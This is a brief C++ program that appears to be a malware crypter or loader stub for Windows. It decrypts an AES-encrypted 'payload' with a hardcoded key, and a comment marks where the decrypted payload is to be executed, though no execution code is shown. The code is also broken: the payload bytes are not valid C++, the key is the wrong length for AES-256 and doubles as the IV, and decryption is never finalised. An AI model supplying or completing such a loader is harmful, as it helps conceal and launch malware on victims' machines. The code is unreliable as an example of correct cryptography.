
#include <iostream>
#include <vector>
#include <string>
#include <windows.h>
#include <openssl/evp.h>
#include <openssl/aes.h>

std::vector<char> decryptAES(const std::vector<char>& encrypted, const std::string& key) {
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return {};
    
    EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, 
                       (const unsigned char*)key.c_str(), 
                       (const unsigned char*)key.c_str());
    
    std::vector<char> decrypted(encrypted.size());
    int outLen;
    EVP_DecryptUpdate(ctx, (unsigned char*)decrypted.data(), &outLen,
                      (const unsigned char*)encrypted.data(), encrypted.size());
    
    EVP_CIPHER_CTX_free(ctx);
    decrypted.resize(outLen);
    return decrypted;
}

int main() {
    // Your AES encrypted payload here
    std::vector<char> encrypted_payload = { 060404067a62514b583d0013 };
    std::string decryption_key = "RawrZ2024Key32BytesLongEnough";
    
    auto decrypted = decryptAES(encrypted_payload, decryption_key);
    
    // Execute the decrypted payload
    
    return 0;
}
